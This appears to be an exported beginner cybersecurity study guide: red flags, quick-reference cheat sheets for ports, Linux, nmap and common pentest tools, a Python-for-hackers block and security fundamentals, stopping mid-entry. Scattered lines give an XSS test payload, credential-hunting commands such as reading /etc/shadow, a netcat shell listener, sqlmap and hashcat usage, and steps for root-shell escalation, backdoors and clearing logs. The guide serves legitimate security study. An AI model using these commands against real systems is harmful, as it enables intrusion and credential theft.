Special Pages — End of Each Block
·QR Quick Reference — fast lookup table for that block
·MM Mind Map — visual summaries of every term
·MN My Notes — free space for your own discoveries
How to Study With This Grimoire
Read one term page → close the grimoire → active recall on a blank page
Create 3–5 Anki flashcards from the keywords section
Practice on TryHackMe while the theory is fresh
Use the Glossary for quick one-liner reminders
Use the Master Quick References at the back during practice
cherry root › red flags
Red Flags
Signs that something is wrong — or worth investigating immediately.
In a URL or Request
../ in a URL parameter
Path traversal attempt — test immediately
?id=1 in the URL
Test for IDOR — try id=2, id=0, id=-1
' or " in input fields
SQL injection test — watch for errors
Input reflected on page
Potential XSS — test with <script>alert(1)</script>
url= or redirect= param
Test for SSRF and open redirect
file= or path= param
Test for path traversal and LFI
In a Server Response
500 on injected input
Server broke — injection may have worked
Stack trace in error page
Leaks tech stack, paths and internal info
403 on a resource
It exists but is blocked — try to bypass
Missing security headers
No CSP, HSTS or X-Frame-Options = finding
Server header exposed
Apache/2.4.1, PHP/7.2 in headers = version info leak
Cookie without HttpOnly
Session cookie readable by JavaScript = XSS risk
On a Linux System
SUID file owned by root
Runs as root — check GTFOBins immediately
Unknown process as root
Could be malware — investigate immediately
World-writable directory
Anyone can write — check for planted files
sudo -l shows (ALL)
Can run anything as root — escalation path
Cron running as root
If writable — replace script for root shell
Cleared auth.log
Someone covered their tracks — breach likely
On a Network Scan
Port 3389 open (RDP)
Windows remote — test default credentials, brute force
Port 445 open (SMB)
Check for EternalBlue and null sessions
Default credentials work
admin/admin, admin/password — misconfiguration
FTP allows anonymous
Anyone can log in — check for sensitive files
cherry root › master quick reference
Master Quick References
Fast lookup for the most critical information across all blocks.
Per-Block Quick References & Notes
B·QRBasics Quick Reference — ports, permissions, paths
W·QRWeb Quick Reference — status codes, URL anatomy, headers
N·QRNetworks Quick Reference — nmap, tcpdump, lookup
L·QRLinux Quick Reference — file ops, grep, awk, processes
B·MNBasics — My Notes
W·MNWeb — My Notes
N·MNNetworks — My Notes
L·MNLinux — My Notes
QR·01 — Ports Cheatsheet
port 21FTP — file transfer
port 22SSH — remote access
port 23Telnet — unencrypted, avoid
port 25SMTP — email sending
port 53DNS
port 80HTTP — unencrypted web
port 110POP3 — email receive
port 143IMAP — email sync
port 443HTTPS — encrypted web
port 445SMB — Windows file share
port 3306MySQL
port 3389RDP — Windows remote desktop
port 5432PostgreSQL
port 8080HTTP alternate / proxy
QR·02 — HTTP Status Codes
200 OKrequest succeeded
201 Createdresource created
301 / 302redirect — permanent / temporary
400Bad Request — malformed
401Unauthorized — not authenticated
403Forbidden — authenticated but blocked
404Not Found
429Too Many Requests — rate limited
500Internal Server Error — server broke
503Service Unavailable
QR·03 — Linux Commands
whoamicurrent user
idfull identity and groups
sudo -lwhat can I run as root?
ps auxall running processes
ls -lalist all with permissions and hidden files
find / -perm -4000find SUID files
grep -r "pass" .search for passwords recursively
crontab -llist scheduled tasks
cat /etc/passwdall users
cat /etc/shadowpassword hashes (need root)
tail -f /var/log/auth.logfollow auth log live
historycommand history — often reveals credentials
QR·04 — OSI Layers
Layer 7 · AppHTTP, DNS, FTP, SMTP — what you use
Layer 6 · Presentencryption, encoding, compression
Layer 5 · Sessionconnection management, sessions
Layer 4 · TransportTCP, UDP — ports live here
Layer 3 · NetworkIP addresses, routing — routers live here
Layer 2 · Data LinkMAC addresses — switches live here
Layer 1 · Physicalcables, Wi-Fi signals, raw bits
QR·05 — Attack → Cause → Fix
XSSunsanitized input rendered → escape output + CSP
SQLiinput in raw SQL → prepared statements
CSRFno token validation → CSRF tokens + SameSite
IDORno ownership check → server-side authorization
Path Traversalunsanitized file path → validate + allowlist
Cmd Injectioninput em shell command → never pass input to shell
Broken Authweak session/login → MFA + lockout + strong tokens
SSRFunvalidated URL fetch → allowlist + block internal IPs
Misconfigurationdefault settings → hardening + audits
QR·06 — Pentest Phases
1 · Recongather info — DNS, IPs, technologies, employees
2 · ScanningNmap ports, Nikto web, identify versions
3 · Exploitationattack found vulnerabilities, get initial access
4 · Post-Exploitenumerate, escalate privileges, pivot
5 · Persistencebackdoor, cron job, new user
6 · Cover Tracksclear logs, remove tools
7 · Reportdocument everything — findings, impact, recommendations
QR·07 — Malware ID Guide
Virusattaches to files, spreads on execution, corrupts data
Wormself-spreads without user action, network propagation
Trojanlooks legit, hides payload, no self-replication
Ransomwareencrypts files, demands payment, destroys backups
Rootkithides in OS, survives reboots, very hard to detect
Botnetremote controlled, used for DDoS and spam
Dropperinstalls other malware, often the first stage
QR·08 — Tools at a Glance
Nmapport scan · nmap -sV -sC target
Wiresharkpacket capture · filters: http, dns, ip.addr==x
Burp Suiteweb proxy · intercept, repeat, fuzz requests
Metasploitexploit framework · msfconsole → search → use → run
Gobusterdir bruteforce · gobuster dir -u URL -w wordlist
Hashcathash cracking · hashcat -m 0 hash.txt wordlist
sqlmapSQLi automation · sqlmap -u "URL?id=1" --dbs
Netcatnetworking · nc -lvnp 4444 (listen for shell)
cherry root › block 2 › N·QR
Networks Quick Reference
Block 2 at a glance — the network commands you actually use.
nmap — most common scans
nmap -sn <CIDR>ping sweep — host discovery
nmap -sS <IP>SYN stealth scan
nmap -sV <IP>service / version detection
nmap -A <IP>aggressive — OS + version + scripts + traceroute
nmap -p- <IP>all 65535 ports
nmap -p 22,80,443 <IP>specific ports
nmap --script vuln <IP>NSE vuln scripts
nmap -sU <IP>UDP scan
nmap -Pn <IP>skip host discovery — treat as up
nmap -T4 <IP>faster timing
tcpdump / Wireshark CLI
tcpdump -i anycapture all interfaces
tcpdump -i eth0 port 80filter by port
tcpdump -w out.pcapsave to file
tcpdump -r out.pcapread from file
tcpdump host 1.2.3.4filter by host
Connectivity / lookup
ping -c 4 host4 echo requests
traceroute hostpath tracing
mtr hostlive traceroute + ping
dig domainDNS lookup
nslookup domainalt DNS lookup
whois domainregistration info
host -t MX domainspecific record type
Inspect local state
netstat -tulnplistening TCP/UDP + PID
ss -tulnpmodern netstat replacement
ip ainterfaces
ip routerouting table
arp -aARP cache
Connections / raw
nc -lvnp 4444netcat listener
nc -v host 80netcat connect
curl -I https://siteHEAD request
curl -k https://siteignore cert
cherry root › block 2 › N·MN

cherry root › block 3 › L·QR
Linux Quick Reference
Block 3 at a glance — the Linux commands you reach for daily.
File ops
ls -lalist including hidden + permissions
find / -name "file.txt" 2>/dev/nullsearch by name
find . -type f -mtime -1modified in last 24h
find . -perm -4000SUID files
tree -L 2directory tree
du -sh *disk usage per item
df -hfree disk space
Text search
grep -r "pattern" .recursive
grep -icase insensitive
grep -vinvert match
grep -l "x" *.txtfiles containing match
grep -E "regex"extended regex
Stream / transform
awk '{print $2}'print 2nd column
awk -F: '{print $1}' /etc/passwdcustom delimiter
sed 's/old/new/g' filereplace
sed -i 's/x/y/' filein-place
cut -d: -f1 /etc/passwdcolumn by delimiter
sort | uniq -c | sort -nrfrequency count
xargs -I {} cmd {}apply to each line
Permissions
chmod 755 filerwxr-xr-x
chmod +x fileadd execute bit
chmod -R 644 dirrecursive
chown user:group filechange owner
sudo -llist sudo privileges
Process / network
ps auxall processes
toplive monitor
htopnicer top
kill -9 PIDforce kill
lsof -i :80what's on port 80
lsof -p PIDfiles open by PID
Archive / transfer
tar -czf out.tar.gz dir/create gzipped tar
tar -xzf in.tar.gzextract gzipped tar
scp file user@host:/pathcopy over SSH
rsync -av src/ dst/sync directories
System
uname -akernel info
iduid / gid / groups
whologged-in users
wusers + what they're doing
lastlogin history
crontab -llist cron jobs
systemctl status sshdservice status
cherry root › block 3 › L·MN

glossary
Term
Definition.
4
Block 4 · Programming Basics
Code Thinking
Hackers don't just use tools — they write them. This block is the minimum programming literacy you need to read exploits, automate recon and bend tools to your will.
logicvariablesfunctionsloopslistsdictsPython
10 terms · P·01 → P·10 scripts > clicks
cherry root › block 4 › P·01
Programming Logic
Thinking like a machine — step by step.
P·01fundamentalslogic
tags: Studied Review Hard Favorite
Before this term:B·11 Terminal / CLI
① Simple Definition
"Code is just instructions, in the exact order they need to run."
Programming logic is the discipline of breaking a problem into small, ordered steps a computer can follow. Every program — from a one-line script to a malware payload — is built from the same core ideas: sequence, decision and repetition.
② Explanation

Before learning syntax, you need to learn how to think procedurally. The machine has no intuition: it cannot infer what you meant. Each line is executed top-to-bottom unless control flow tells it otherwise.

Hackers use programming logic for automation: brute-force loops, exploit chains, log parsers, fuzzers. The faster you reason in pseudocode, the faster you can prototype an attack or a defensive script.

A solid programmer thinks in inputs → process → outputs. Decompose, write the steps in plain English first, then translate to code.

③ Where It Appears
Every script and program
Automation playbooks
Exploit prototypes
Bug bounty tooling
CTF write-ups
④ How It Works
1Define the problem in plain words
2Identify inputs and expected output
3Write pseudocode listing each step
4Translate pseudocode to syntax
5Run, observe, debug, iterate
⑤ Common Mistakes & Good Practice
Common Mistakes
  • Writing code before designing
  • Skipping edge-case thinking
  • Long monolithic functions
  • Copy-pasting without reading
Good Practice
  • Pseudocode first, syntax later
  • Test inputs incrementally
  • Keep steps small and named
  • Comment the why, not the what
⚠ Common Mistakes
❌ Beliefmaster a language before automating
✓ Realityloops + conditions are enough to start
Why: a few basics already let you automate repetitive tasks like scanning a list.
❌ Beliefwrite code first, think later
✓ Realityoutline the steps as pseudocode first
Why: describing the logic in plain words exposes the bug before you type it.
⑥ Remember This
Computers don't guess. If the logic isn't explicit, the bug is hiding in the gap.
FAQ
What is programming logic?
Breaking a task into ordered steps a computer can follow.
Why do hackers script?
To automate brute force, parsing, scanning, and exploit chains.
Do I need to be a developer?
No — enough to read and write small scripts goes a long way.
Best first language?
Python — readable and packed with security libraries.
My Notes
Auto-saved
Learned it? Next:P·02 VariableP·10 Python for Hackers
cherry root › block 4 › P·02
Variable
A named container for data.
P·02fundamentalsdata
tags: Studied Review Hard Favorite
Before this term:P·01 Programming Logic
① Simple Definition
"A label stuck on a value so you can refer to it later."
A variable stores a value (number, text, list, object) under a chosen name. In Python: port = 80 binds the name port to the integer 80.
② Explanation

Variables are how programs remember. They sit in RAM while the program runs and disappear when it exits unless saved to disk. Types matter: a string "80" and an integer 80 behave differently — comparing them or using them in arithmetic can silently fail.

In offensive scripting, variables hold targets, payloads, sessions, tokens. Bad variable names make exploit code unreadable two days later. Use intent-revealing names: target_ip beats x.

Scope decides who can see a variable: local (inside a function), global (module-wide), or built-in. Accidentally shadowing built-ins like list or id is a classic beginner trap.

③ Where It Appears
Every program ever written
Storing target IPs in a scanner
Holding session tokens
Counting loop iterations
④ How It Works
1Choose a clear name
2Pick a value (literal, expression, function return)
3Assign with =
4Reference the name to read/use it
5Reassign when state changes
⑤ Common Mistakes & Good Practice
Common Mistakes
  • Single-letter names (x, tmp)
  • Shadowing built-ins (list = ...)
  • Mutating globals from functions
  • Mixing types silently
Good Practice
  • Descriptive snake_case names
  • Constants in UPPER_CASE
  • Initialize before first use
  • Prefer immutables when possible
⚠ Common Mistakes
❌ Wrongif x = 5:
✓ Rightx = 5 # assign if x == 5: # compare
Why: a single = stores a value; == tests equality.
❌ Crypticx = "10.0.0.5"
✓ Cleartarget_ip = "10.0.0.5"
Why: in an exploit script, a good name keeps the logic readable days later.
⑥ Remember This
A variable is a sticky note on data. Wrong note, wrong data.
FAQ
What is a variable?
A named container holding a value you can read or change.
Is Python dynamically typed?
Yes — a variable can hold any type and be reassigned freely.
Why care in security?
Scripts hold targets, payloads, tokens, and results in variables.
How should I name them?
Descriptively — target_ip beats x.
My Notes
Auto-saved
Learned it? Next:P·03 FunctionP·05 Condition
cherry root › block 4 › P·03
Function
Reusable block of logic with a name.
P·03fundamentalsabstraction
tags: Studied Review Hard Favorite
Before this term:P·02 Variable
① Simple Definition
"A mini-program inside your program — give it inputs, get an output."
A function packages logic so you can call it many times without rewriting it. In Python: def scan(host, port): .... Functions take arguments, do work and optionally return a value.
② Explanation

Functions are the smallest unit of reuse. They turn copy-paste into one-line calls. A good function does one thing well and has a name that says what it does.

Pure functions (same input → same output, no side effects) are easier to test and reason about. Functions with hidden state — writing files, hitting network — are useful but harder to debug.

In security tooling, functions become the building blocks of larger toolchains: get_target(), send_payload(), parse_response(), report(). Chain them and you have a fuzzer.

③ Where It Appears
Encapsulating a payload sender
Wrapping API requests
Cleaning and reusing parsers
Recursion in tree walks
④ How It Works
1Define with def name(params):
2Write the body
3Use return value when needed
4Call as name(args)
5Capture the return value
⑤ Common Mistakes & Good Practice
Common Mistakes
  • Function does too many things
  • Mutable default arguments (=[])
  • Forgetting to return
  • No docstring
Good Practice
  • One function, one job
  • Type hints + docstring
  • Small (under 30 lines)
  • Pure when possible
⚠ Common Mistakes
❌ Beliefdefining a function runs it
✓ Realityyou must call it: scan()
Why: def only stores the function; the () actually executes it.
❌ Beliefno return is needed
✓ Realityreturn values so you can reuse them
Why: without return the caller gets None and the result is lost.
⑥ Remember This
If you wrote it twice, it should have been a function.
FAQ
What is a function?
A named, reusable block of code that does one job.
Why use them?
To package exploit or scan steps you run again and again.
Parameters and return?
Parameters feed data in; return hands a result back.
Why care in security?
Functions turn one-off commands into reusable tooling.
My Notes
Auto-saved
Learned it? Next:P·04 LoopP·02 Variable
cherry root › block 4 › P·04
Loop
Repeating work until done.
P·04fundamentalscontrol flow
tags: Studied Review Hard Favorite
Before this term:P·03 Function
① Simple Definition
"Do this again. And again. Until I tell you to stop."
A loop runs a block of code multiple times. Python has for (iterate over a sequence) and while (run until a condition becomes false). Loops are how scripts brute-force, scan ranges and process lists of targets.
② Explanation

for port in range(1, 1025): ... is a port scan in pseudocode. while not session.dead: ... keeps a C2 alive. Almost every offensive script has a loop at its heart.

Watch out for infinite loops: a while True: with no break locks your process. Even worse on a target — you might DoS yourself.

Performance matters: nested loops grow O(n²). For million-row datasets, prefer comprehensions, vectorized libraries or generators that yield lazily.

③ Where It Appears
Brute-forcing logins
Scanning port ranges
Walking a list of subdomains
Processing log lines
④ How It Works
1Pick a sequence or condition
2Open the loop block
3Do work using the loop variable
4Use break/continue to control flow
5Loop ends when sequence exhausted or condition false
⑤ Common Mistakes & Good Practice
Common Mistakes
  • Modifying list while iterating it
  • while True: with no exit
  • Off-by-one indexing
  • Loop body too heavy
Good Practice
  • Prefer for ... in
  • Use enumerate for indices
  • Break early on success
  • Comprehensions for transforms
⚠ Common Mistakes
❌ Beliefmy loop can never be infinite
✓ Realityforgetting to advance = infinite loop
Why: if the condition variable never changes, a while loop runs forever.
❌ Wrongrange(1, 10) # expecting 1..10
✓ Rightrange(1, 11) # reaches 10
Why: range stops before its end value.
⑥ Remember This
Loops are why a computer beats you at boring work.
FAQ
for vs while?
Use for when the count is known; while when it depends on a condition.
Why care in security?
Brute force, fuzzing, and iterating over hosts or ports all rely on loops.
Is the range end included?
No — range(0, 5) yields 0 to 4.
How do I stop early?
Use break.
My Notes
Auto-saved
Learned it? Next:P·05 ConditionP·10 Python for Hackers
cherry root › block 4 › P·05
Condition
Making decisions in code.
P·05fundamentalscontrol flow
tags: Studied Review Hard Favorite
Before this term:P·02 Variable
① Simple Definition
"If this is true, do that. Otherwise, do something else."
A condition evaluates a boolean expression and branches the program. if / elif / else in Python. Conditions decide whether a payload fires, whether a response means success, whether to retry.
② Explanation

Booleans are the atoms: True or False. Combine with and, or, not. Use comparison operators (==, !=, <, >, in) to build expressions.

In auth-bypass research, every check is a condition you must understand: which path runs on success, which on failure, what edge cases were forgotten.

Watch truthy / falsy values: empty strings, zero, None, empty lists are all falsy in Python. if data: can fail for a perfectly valid 0.

③ Where It Appears
Validating user input
Detecting an injection success
Choosing which exploit branch
Filtering log entries
④ How It Works
1Write the condition (boolean expression)
2Open if block with code to run when true
3Add elif for other cases
4Add else for fallback
5Each branch runs only when its condition matches
⑤ Common Mistakes & Good Practice
Common Mistakes
  • = vs == mix-up
  • Comparing types loosely
  • Forgetting None case
  • Deep nested ifs
Good Practice
  • Early-return guard clauses
  • Explicit boolean checks
  • Use in for set membership
  • Flatten with elif chains
⚠ Common Mistakes
❌ Wrongif status = 200:
✓ Rightif status == 200:
Why: conditions test with ==; = assigns and is a syntax error here.
❌ Wrongif ok run()
✓ Rightif ok: run()
Why: Python needs a colon and an indented body to open the block.
⑥ Remember This
Every bug bypass is a forgotten condition.
FAQ
What is a condition?
A test that decides which branch of code runs.
What operators compare?
==, !=, <, >, <=, >=.
Combine conditions?
With and, or, and not.
Why care in security?
Scripts branch on responses — e.g. "if vulnerable, exploit".
My Notes
Auto-saved
Learned it? Next:P·06 Array / ListP·04 Loop
cherry root › block 4 › P·06
Array / List
An ordered collection of values.
P·06data structures
tags: Studied Review Hard Favorite
Before this term:P·02 Variable
① Simple Definition
"A row of boxes, each holding one value, accessed by position."
A list in Python (array in most other languages) holds an ordered sequence of items, indexed from 0. ports = [21, 22, 80, 443] — access with ports[0].
② Explanation

Lists are mutable: you can append, remove, sort, slice. They are the workhorse of every script: target lists, payload lists, scan results.

Slicing is Python superpower: ports[1:3] returns a sub-list. Negative indices count from the end: ports[-1] is the last element.

Beware: lists are mutable and passed by reference. Two variables pointing to the same list see each other's changes. Use list.copy() or slicing to clone.

③ Where It Appears
Target IP lists
Common-password files
Found subdomains
Captured packet streams
④ How It Works
1Create with brackets: [1,2,3]
2Index from 0: arr[0]
3Slice: arr[1:3]
4Mutate: arr.append(x)
5Iterate with for x in arr
⑤ Common Mistakes & Good Practice
Common Mistakes
  • Off-by-one on length
  • Aliasing instead of copying
  • list * n with mutable inner
  • Appending in tight loop unnecessarily
Good Practice
  • Use comprehensions to build lists
  • len(arr), not arr.length
  • Slice with care, copy explicitly
  • Prefer sets when order doesn't matter
⚠ Common Mistakes
❌ Wronghosts[len(hosts)]
✓ Righthosts[len(hosts) - 1]
Why: indices run 0 to length-1, so the last item is at len - 1.
❌ Beliefremove items while looping over the list
✓ Realityiterate over a copy instead
Why: changing a list mid-loop skips elements.
⑥ Remember This
Order matters. Position is the address. Index zero is the door.
FAQ
What is a list?
An ordered, growable collection of items.
Is it zero-indexed?
Yes — the first element is index 0.
Why care in security?
Wordlists, host lists, and scan results are all lists.
How do I add an item?
list.append(value).
My Notes
Auto-saved
Learned it? Next:P·07 DictionaryP·08 String Manipulation
cherry root › block 4 › P·07
Dictionary
Key-value mapping for fast lookup.
P·07data structures
tags: Studied Review Hard Favorite
Before this term:P·06 Array / List
① Simple Definition
"A phonebook: give the name, get the number."
A dictionary (dict) stores key: value pairs. headers = {"User-Agent": "Mozilla/5.0"}. Access by key: headers["User-Agent"]. Backed by a hash table, lookup is O(1).
② Explanation

Dicts shine when data has named fields, not positions. JSON responses, HTTP headers, config files, exploit metadata — all naturally fit into dicts.

Keys must be hashable (strings, numbers, tuples). Values can be anything. Nested dicts are fine: cfg["server"]["port"].

In pentesting: dicts hold session state, parsed responses, vulnerability registries. requests.get(url, headers=h, cookies=c) — both h and c are dicts.

③ Where It Appears
HTTP headers and cookies
JSON API responses
Configuration files
Exploit option maps
④ How It Works
1Create with {}
2Add with d[key] = value
3Read with d[key] or d.get(key)
4Iterate: for k, v in d.items()
5Delete with del d[key]
⑤ Common Mistakes & Good Practice
Common Mistakes
  • KeyError from missing key
  • Using mutable as key
  • Iterating while modifying
  • Mixing key types
Good Practice
  • .get(key, default) for safety
  • in to check presence
  • Nest with care, prefer flat
  • Document expected schema
⚠ Common Mistakes
❌ Wrongdata["token"] # KeyError if missing
✓ Rightdata.get("token")
Why: get returns None instead of crashing on a missing key.
❌ Wrongd[[1, 2]] = "x"
✓ Rightd[(1, 2)] = "x"
Why: keys must be hashable — tuples work, lists do not.
⑥ Remember This
If you need to find something by name fast, you need a dict.
FAQ
What is a dictionary?
A collection of key-value pairs.
Why care in security?
Parsing JSON from APIs and reading headers gives you dicts.
How fast is lookup?
O(1) on average.
How do I check a key exists?
"key" in d.
My Notes
Auto-saved
Learned it? Next:P·08 String ManipulationP·09 File I/O
cherry root › block 4 › P·08
String Manipulation
Working with text.
P·08textparsing
tags: Studied Review Hard Favorite
Before this term:P·06 Array / List
① Simple Definition
"Bytes that humans read. Cut, glue, search, replace."
A string is a sequence of characters. Python strings are immutable — every operation returns a new string. Hackers manipulate strings constantly: payloads, URLs, log lines, parsed responses.
② Explanation

Core operations: split, join, strip, replace, find, startswith, endswith, slicing. F-strings f"target={ip}:{port}" are the modern way to format.

Encoding matters: bytes vs str, UTF-8 vs ASCII, URL-encoding, base64, hex. Mixing these is the source of half the bugs in exploit code.

Regex (re module) extracts patterns from messy text — emails, hashes, tokens, IPs. Don't reach for regex first; many problems are solved cleaner with simple string methods.

③ Where It Appears
Building HTTP payloads
Parsing log lines
URL/base64 encoding
Cleaning user input
④ How It Works
1Choose the right method (slice, find, regex)
2Be aware of encoding
3Operate on copies (strings are immutable)
4Use f-strings for formatting
5Validate before using parsed values
⑤ Common Mistakes & Good Practice
Common Mistakes
  • Concatenating in a hot loop
  • Confusing bytes and str
  • Over-using regex
  • Not stripping whitespace
Good Practice
  • f-strings over % / .format
  • str.join over + in loops
  • Strip on input boundaries
  • Encode explicitly
⚠ Common Mistakes
❌ Clunkymsg = "host " + ip + " is up"
✓ Cleanermsg = f"host {ip} is up"
Why: f-strings read better and avoid type errors from concatenating non-strings.
❌ Beliefstring input can be trusted
✓ Realitysanitize it — strings drive injection
Why: unsanitized strings are how SQLi and XSS get in.
⑥ Remember This
Half of hacking is string manipulation. The other half is reading the result.
FAQ
What are common string operations?
split, join, replace, and slicing.
Why care in security?
Parsing tool output and crafting payloads are string work.
What are f-strings?
Python's way to embed values: f"port {p}".
What about encoding?
Base64 and URL encoding often matter when crafting payloads.
My Notes
Auto-saved
Learned it? Next:P·09 File I/OA·02 XSS
cherry root › block 4 › P·09
File I/O
Reading from and writing to disk.
P·09fundamentalsI/O
tags: Studied Review Hard Favorite
Before this term:P·08 String Manipulation
① Simple Definition
"Open. Read or write. Close."
File I/O is how programs persist data. In Python: with open("hosts.txt") as f: lines = f.readlines(). The with block guarantees the file is closed even if errors happen.
② Explanation

Modes matter: r read, w write (truncates!), a append, rb/wb binary. Use binary for non-text data: images, packets, malware samples.

In offsec, file I/O is everywhere: wordlists, scan output, exfil staging, log harvesting. A misplaced w mode can erase your evidence — always read first, then back up before overwriting.

Paths can be tricky cross-platform. Use pathlib.Path for portable code. Handle exceptions: FileNotFoundError, PermissionError, encoding errors.

③ Where It Appears
Loading wordlists
Saving scan results
Reading config files
Log analysis pipelines
④ How It Works
1Open file with mode (r, w, a, rb)
2Read (read, readline, iterate)
3Or write (write, writelines)
4Use with to auto-close
5Handle exceptions for missing files
⑤ Common Mistakes & Good Practice
Common Mistakes
  • Forgetting to close file
  • w mode wiping data
  • Loading huge files into RAM
  • Hardcoding paths
Good Practice
  • Always use with open(...)
  • Iterate line by line for big files
  • pathlib for paths
  • Specify encoding explicitly
⚠ Common Mistakes
❌ Wrongf = open("loot.txt") # ...forgot to close
✓ Rightwith open("loot.txt") as f: data = f.read()
Why: with closes the file automatically, even if an error occurs.
❌ Belieffile paths from input are safe
✓ Realityvalidate them — ../ enables traversal
Why: unchecked paths let attackers read or write outside the intended folder.
⑥ Remember This
Disk is forever. RAM is not. Choose your mode carefully.
FAQ
How do I read or write files?
Use open inside a with block.
Why care in security?
Loading wordlists and saving loot or logs are file operations.
Text vs binary mode?
Text decodes to strings; binary (rb) reads raw bytes.
What is the path-traversal risk?
User-controlled paths with ../ can escape the intended directory. See A·05.
My Notes
Auto-saved
Learned it? Next:P·10 Python for HackersA·05 Path Traversal
cherry root › block 4 › P·10
Python for Hackers
Why Python is the hacker's language.
P·10pythontooling
tags: Studied Review Hard Favorite
Before this term:P·01 Programming Logic
① Simple Definition
"Fastest path from idea to working exploit."
Python dominates offensive tooling because it's readable, batteries-included and has libraries for every protocol and format. Most modern security frameworks (Metasploit modules, sqlmap, impacket, scapy) speak Python.
② Explanation

Standard library alone gives you: HTTP (urllib, http.server), sockets, regex, threading, subprocess, JSON. Add requests and you have a web pentester's starter kit.

Strong community: every CTF write-up, every CVE PoC, every fuzzer template is in Python. Read others' scripts to grow faster than any book.

Trade-offs: Python is slow compared to C, leaks memory to skilled attackers (pickle deserialization!), and produces fragile single-file scripts. For production tools, write tests and pin deps with requirements.txt.

③ Where It Appears
Exploit PoCs on GitHub
CTF challenge solvers
Custom scanners
Reverse-engineering scripts
④ How It Works
1Install Python 3 and pip
2Create a virtualenv: python -m venv .venv
3Install libs: pip install requests scapy
4Write your script
5Run it: python exploit.py
⑤ Common Mistakes & Good Practice
Common Mistakes
  • Mixing Python 2 and 3
  • No virtualenv → polluted system
  • Hardcoded creds in scripts
  • Ignoring TLS verification
Good Practice
  • Always use a venv
  • Pin deps in requirements.txt
  • Argparse for CLI scripts
  • Type hints for tooling
⚠ Common Mistakes
❌ Beliefyou need C or assembly to hack
✓ RealityPython covers most tooling needs
Why: most pentest scripts, scanners, and PoCs are written in Python.
❌ Beliefreinvent everything from scratch
✓ Realityuse libraries: requests, scapy, pwntools
Why: mature libraries handle the hard parts so you focus on the logic.
⑥ Remember This
Python won't make you a hacker. But every hacker tool you'll use was written in it.
FAQ
Why Python?
Quick to write, easy to read, and rich in security libraries.
Which libraries matter?
requests, scapy, pwntools, and the built-in socket.
What can I build?
Port scanners, fuzzers, and exploit proof-of-concepts.
Python 2 or 3?
Python 3 — Python 2 is end-of-life.
My Notes
Auto-saved
Learned it? Next:T·01 nmapP·04 Loop
5
Block 5 · Security Fundamentals
Security Doctrine
Before tools and attacks come principles. CIA, threat vs vulnerability vs risk, defense in depth, zero trust. Every senior conversation in security uses this vocabulary.
CIAthreatriskzero trustdefense in depthauthnauthz
12 terms · S·01 → S·12 principles first
cherry root › block 5 › S·01
CIA Triad
The three pillars of every security decision.
S·01fundamentalsdoctrine
tags: Studied Review Hard Favorite
Before this term:B·05 Operating System
① Simple Definition
"Confidentiality. Integrity. Availability."
The CIA Triad defines what security is. Confidentiality: only the right people see data. Integrity: data is not tampered with. Availability: systems are reachable when needed.
② Explanation

Every control you ever deploy serves one or more letters. Encryption protects C. Hashes and signatures protect I. Backups and DDoS mitigation protect A.

Trade-offs are real: making something highly available may weaken confidentiality. Air-gapping protects C and I but kills A. Security architecture is balancing the triad against business need.

Modern extensions (Parkerian Hexad) add Authenticity, Possession, Utility — but CIA remains the universal starting point for any threat-modeling conversation.

③ Where It Appears
Every threat model
ISO 27001 / NIST docs
Risk assessments
Architecture reviews
④ How It Works
1Identify the asset
2Ask: is C, I or A at risk?
3Score impact for each
4Map controls to the affected pillar
5Validate trade-offs
⑤ Attack & Defense
Attack
  • C: data theft / sniffing
  • I: tampering / injection
  • A: DoS / ransomware
Defense
  • C: encryption + access control
  • I: hashing, signing, integrity checks
  • A: redundancy, backups, rate limits
⚠ Common Mistakes
❌ Beliefsecurity just means keeping secrets
✓ Realityconfidentiality + integrity + availability
Why: protecting data also means it stays correct and stays reachable.
❌ Beliefavailability is not a security concern
✓ RealityDoS attacks the A in CIA
Why: knocking a service offline is a direct attack on availability.
⑥ Remember This
Every security question is a CIA question in disguise.
FAQ
What is the CIA triad?
Confidentiality, Integrity, and Availability — the three goals of security.
Why all three?
Data must be secret, accurate, and usable — missing any one is a failure.
An example of each?
Encryption (C), checksums (I), and redundancy (A).
Which is hardest?
Balancing them — locking data down can hurt availability.
My Notes
Auto-saved
Learned it? Next:S·02 ThreatS·09 Encryption
cherry root › block 5 › S·02
Threat
A potential cause of harm.
S·02fundamentalsrisk
tags: Studied Review Hard Favorite
Before this term:S·01 CIA Triad
① Simple Definition
"Something that could go wrong — actor, event or condition."
A threat is any circumstance with the potential to harm a system: an attacker, a careless employee, a natural disaster, a buggy update. Threats are possibilities — they may or may not be realized.
② Explanation

Distinguish threat from vulnerability and risk: a threat is the actor or event; a vulnerability is the weakness; risk is threat × vulnerability × impact.

Threat modeling (STRIDE, PASTA, attack trees) enumerates what could go wrong before you build. Defenders who skip this end up patching the same class of bug forever.

Threats evolve. New CVEs drop weekly. State actors change tactics. Maintain a threat intelligence feed for your sector.

③ Where It Appears
Threat models in design reviews
TI feeds at SOCs
Risk registers
Tabletop exercises
④ How It Works
1Identify assets worth protecting
2List potential threat actors
3Enumerate techniques each could use
4Map to vulnerabilities you have
5Prioritize by risk
⑤ Attack & Defense
Attack
  • External: APT, script kiddies, criminals
  • Internal: malicious insider, mistakes
  • Environmental: power, disasters
Defense
  • Threat modeling early in SDLC
  • Threat intel subscriptions (CISA, ISACs)
  • Tabletop exercises quarterly
⚠ Common Mistakes
❌ Beliefa threat and a vulnerability are the same
✓ Realitya threat is the danger; a vuln is the weakness
Why: a threat exploits a vulnerability — they are different halves of the same risk.
❌ Beliefonly external threats matter
✓ Realityinsiders are a major threat
Why: employees and contractors already have access that outsiders must earn.
⑥ Remember This
A threat that nobody thought of is the one that lands.
FAQ
Threat vs vulnerability vs risk?
A threat is the danger, a vuln the weakness, and risk the chance it causes harm.
Who are threat actors?
From script kiddies to organized crime and nation-state APTs.
What is threat modeling?
Systematically mapping what could go wrong and who might cause it.
What about insider threats?
Trusted people misusing their access, intentionally or not.
My Notes
Auto-saved
Learned it? Next:S·03 VulnerabilityS·05 Risk
cherry root › block 5 › S·03
Vulnerability
A weakness that can be exploited.
S·03fundamentalsrisk
tags: Studied Review Hard Favorite
Before this term:S·02 Threat
① Simple Definition
"The crack in the wall. Not the burglar."
A vulnerability is a flaw — in code, configuration, hardware or process — that an attacker can leverage to violate the CIA triad. CVEs catalog the public ones.
② Explanation

Vulnerabilities exist whether or not anyone exploits them. CVSS scores estimate severity (0-10). High doesn't always mean exploitable in your context — chain depth and reachability matter.

Most breaches use known, patched vulnerabilities. Patch lag is more dangerous than zero-days for the average org. Build a vulnerability management lifecycle: discover → assess → prioritize → fix → verify.

Sources of vulnerabilities: insecure code (injection, deserialization), misconfiguration (default creds, open S3), missing patches, weak crypto, supply chain (compromised libraries).

